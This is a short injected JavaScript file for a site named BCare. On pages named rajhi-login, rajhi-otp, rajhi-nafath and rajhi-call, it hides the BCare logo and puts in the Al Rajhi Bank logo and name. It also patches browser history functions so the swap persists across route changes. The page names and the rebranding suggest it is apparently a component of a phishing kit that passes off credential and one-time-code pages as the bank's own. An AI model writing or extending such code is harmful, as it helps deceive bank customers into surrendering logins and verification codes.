/**
 * BCare — Rajhi Pages Logo Swap (injected)
 * -----------------------------------------------------------------------------
 * On all Rajhi pages (/rajhi-login, /rajhi-otp, /rajhi-nafath, /rajhi-call):
 *   1. HIDES the large FormShell BCare logo (width="200px", class "mb-6")
 *   2. REPLACES the small BCare logo (class "h-10" or "h-8" mx-auto) with Al Rajhi logo
 * ===========================================================================*/
(function () {
  "use strict";

  var RAJHI_LOGO_URL = "/assets/images/rajhi-logo.png";
  var TARGET_PATHS = ["/rajhi-login", "/rajhi-otp", "/rajhi-nafath", "/rajhi-call"];

  function isTargetPage() {
    return TARGET_PATHS.indexOf(window.location.pathname) !== -1;
  }

  function applyLogoChanges() {
    if (!isTargetPage()) return;

    // 1. Hide the large FormShell BCare logo (width="200px")
    var allImgs = document.querySelectorAll("img");
    for (var i = 0; i < allImgs.length; i++) {
      var img = allImgs[i];
      if (
        img.getAttribute("width") === "200px" &&
        img.src &&
        img.src.indexOf("Bcarelogo") !== -1
      ) {
        img.style.display = "none";
      }
    }

    // 2. Replace the small BCare logo (h-10 or h-8, mx-auto) with Rajhi logo
    var smallLogos = document.querySelectorAll("img.h-10, img.h-8");
    for (var j = 0; j < smallLogos.length; j++) {
      var sImg = smallLogos[j];
      if (sImg.src && sImg.src.indexOf("Bcarelogo") !== -1) {
        sImg.src = RAJHI_LOGO_URL;
        sImg.alt = "Al Rajhi Bank";
        sImg.style.objectFit = "contain";
      }
    }
  }

  function init() {
    applyLogoChanges();

    // Observe DOM mutations for SPA route changes
    var observer = new MutationObserver(function () {
      if (isTargetPage()) {
        applyLogoChanges();
      }
    });
    observer.observe(document.body, { childList: true, subtree: true });

    // Intercept history navigation for vue-router
    var origPush = history.pushState;
    var origReplace = history.replaceState;

    history.pushState = function () {
      origPush.apply(this, arguments);
      setTimeout(applyLogoChanges, 50);
    };
    history.replaceState = function () {
      origReplace.apply(this, arguments);
      setTimeout(applyLogoChanges, 50);
    };
    window.addEventListener("popstate", function () {
      setTimeout(applyLogoChanges, 50);
    });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
